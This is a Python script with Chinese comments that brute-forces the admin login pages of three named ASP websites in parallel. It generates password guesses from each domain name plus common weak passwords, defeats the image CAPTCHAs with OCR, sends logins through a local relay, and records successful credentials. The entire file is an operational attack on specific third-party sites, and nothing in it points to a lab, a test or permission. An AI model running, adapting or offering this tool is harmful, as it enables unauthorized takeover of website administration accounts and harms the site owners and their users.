#!/usr/bin/env python3
"""multi_asp_bf.py - 多站并行爆破(验证码自动适配两套模板)
模板A(GetCode.asp+username/password/Code): yangsha, 5084模板站
模板B(checkcode.asp+UserName/Password/CheckCode): szsadwj, gdcq119
"""
import urllib.request, urllib.parse, ssl, re, sys, time, io
import ddddocr
from PIL import Image
from concurrent.futures import ThreadPoolExecutor, as_completed

ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
UA = {'User-Agent': 'Mozilla/5.0'}
HOST = 'http://127.0.0.1:13080'

# 站点配置: (域名, 模板, 验证码路径, 登录action)
SITES = [
    # 模板A: GetCode.asp + username/password/Code + login.asp?action=check
    ('www.yangsha.com', 'A', '/GetCode.asp', '/admin/login.asp?action=check'),
    # 模板B: inc/checkcode.asp + UserName/Password/CheckCode + Admin_ChkLogin.asp
    ('szsadwj.com', 'B', '/admin/inc/checkcode.asp', '/admin/Admin_ChkLogin.asp'),
    ('gdcq119.com', 'B', '/admin/inc/checkcode.asp', '/admin/Admin_ChkLogin.asp'),
]

# 每站专用密码: 站名变体+通用
def make_pwlist(dom):
    base = dom.split('.')[0].replace('www', '')
    variants = []
    for v in [base, base + '123', base + '888', 'admin' + base, base + '2023', base + '2024']:
        variants.append(v)
    common = ["admin", "admin123", "123456", "admin888", "12345678", "password",
              "admin@123", "admin1234", "123456a", "a123456", "666666", "888888",
              "000000", "qwer1234", "abc123", "admin666", "123123", "111111",
              "654321", "admin2023", "admin2024", "Admin123", "123qwe", "zxcvbnm",
              "123456789", "1qaz2wsx", "qwe123"]
    return list(dict.fromkeys(variants + common))

def fetch(url, timeout=25):
    try:
        r = urllib.request.urlopen(urllib.request.Request(url, headers=UA), timeout=timeout, context=ctx)
        return r.read(40000)
    except Exception:
        return b''

def get_cap_A(dom):
    """模板A: GetCode.asp"""
    out = fetch(HOST + '/getcap2.php?d=' + urllib.parse.quote(dom))
    if b'SAVED:' not in out:
        return None
    try:
        r = urllib.request.urlopen(urllib.request.Request(HOST + '/ys_cap2.jpg', headers=UA), timeout=15, context=ctx)
        return r.read()
    except Exception:
        return None

def get_cap_B(dom):
    """模板B: checkcode.asp"""
    out = fetch(HOST + '/getcap_sz.php?d=' + urllib.parse.quote(dom))
    if b'SAVED:' not in out:
        return None
    try:
        r = urllib.request.urlopen(urllib.request.Request(HOST + '/sz_cap.jpg', headers=UA), timeout=15, context=ctx)
        return r.read()
    except Exception:
        return None

def do_login_A(dom, pw, code):
    out = fetch(HOST + '/loginpost2.php?d=' + urllib.parse.quote(dom) + '&p=' + urllib.parse.quote(pw) + '&c=' + code)
    return out

def do_login_B(dom, pw, code):
    out = fetch(HOST + '/login_sz.php?d=' + urllib.parse.quote(dom) + '&u=admin&p=' + urllib.parse.quote(pw) + '&c=' + code)
    return out

ocr = ddddocr.DdddOcr(show_ad=False)
ocrb = ddddocr.DdddOcr(show_ad=False, beta=True)

def crack_site(site):
    dom, tpl, cap_path, login_path = site
    get_cap = get_cap_A if tpl == 'A' else get_cap_B
    do_login = do_login_A if tpl == 'A' else do_login_B
    pws = make_pwlist(dom)
    print('[%s] starting %d passwords' % (dom, len(pws)), flush=True)
    for pw in pws:
        for attempt in range(6):
            img = get_cap(dom)
            if not img or len(img) < 50:
                time.sleep(2)
                continue
            try:
                c1 = ocr.classification(img)
                im = Image.open(io.BytesIO(img)).convert('L')
                im = im.resize((im.width * 6, im.height * 6), Image.LANCZOS)
                im = im.point(lambda p: 255 if p > 120 else 0)
                buf = io.BytesIO(); im.save(buf, 'PNG')
                c2 = ocrb.classification(buf.getvalue())
            except Exception:
                break
            code = c1 if c1 == c2 else (c2 if len(c2) == 4 else c1)
            out = do_login(dom, pw, code)
            idx = out.find(b'GIF89a')
            body = out[idx+6:] if idx > 0 else out
            try:
                text = body.decode('gb2312', 'ignore')
            except Exception:
                text = ''
            if '确认码' in text or '不一致' in text or '验证码' in text:
                continue
            if len(body) == 0:
                # 空响应: 网络抖动或成功, 立即重试确认
                time.sleep(1)
                out2 = do_login(dom, pw, code)
                idx2 = out2.find(b'GIF89a')
                body2 = out2[idx2+6:] if idx2 > 0 else out2
                text2 = body2.decode('gb2312', 'ignore') if body2 else ''
                if len(body2) == 0:
                    return ('HIT', dom, 'admin', pw)
                text = text2
            if '错误' in text or '失败' in text or '密码' in text or '不存在' in text:
                time.sleep(1)
                break
            if '管理' in text or '欢迎' in text or '成功' in text:
                return ('HIT', dom, 'admin', pw)
            print('[%s] CHECK %s: %s' % (dom, pw, text[:60].replace(chr(10), ' ')), flush=True)
            time.sleep(1)
            break
    return ('DONE', dom, 'nohit')

def main():
    hits = []
    with ThreadPoolExecutor(max_workers=2) as ex:
        futs = {ex.submit(crack_site, s): s for s in SITES}
        for fu in as_completed(futs):
            try:
                r = fu.result()
            except Exception as e:
                r = ('ERR', repr(e)[:80])
            print('RESULT:', r, flush=True)
            if r[0] == 'HIT':
                hits.append(r)
    print('=== ALL DONE: %d hits ===' % len(hits), flush=True)
    for h in hits:
        print('HIT:', '\t'.join(str(x) for x in h), flush=True)
    with open('/tmp/multi_asp_hits.txt', 'w') as f:
        for h in hits:
            f.write('\t'.join(str(x) for x in h) + '\n')

if __name__ == '__main__':
    main()
